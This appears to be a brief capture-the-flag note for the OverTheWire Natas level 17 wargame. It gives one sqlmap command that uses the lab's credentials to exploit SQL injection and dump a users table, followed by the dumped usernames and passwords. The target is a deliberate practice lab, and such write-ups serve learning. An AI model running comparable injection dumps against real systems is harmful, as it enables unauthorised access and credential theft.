@@ -1,0 +1,14 @@
+# SqlMap
+1) sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" --dbms=mysql --threads=10 --auth-type=Basic --auth-cred=natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC --data "username=natas18" --level=5 --risk=3 --batch -D natas17 -T users -C 'username, password' --dump --batch
+
+Database: natas17
+Table: users
+[4 entries]
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| user1    | 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd |
+| natas18  | 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ |
+| user2    | MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 |
+| user3    | VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD |
++----------+----------------------------------+
